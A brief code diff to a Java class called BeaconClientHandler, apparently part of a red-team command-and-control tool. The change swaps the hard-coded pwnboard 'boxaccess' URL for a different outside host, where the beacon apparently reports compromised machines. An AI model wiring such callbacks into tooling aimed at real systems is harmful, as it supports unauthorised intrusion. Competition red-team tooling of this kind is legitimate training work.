@@ -66,7 +66,7 @@ public class BeaconClientHandler implements Runnable{
         this.shellLock = shellLock;
 
         try{
-            this.pwnboardUri = new URI("https://pwnboard.win/pwn/boxaccess");
+            this.pwnboardUri = new URI("https://margs.salsas.bar/boxaccess");
             this.pwnboardUrl = this.pwnboardUri.toURL();
         } catch (URISyntaxException e){
             e.printStackTrace();
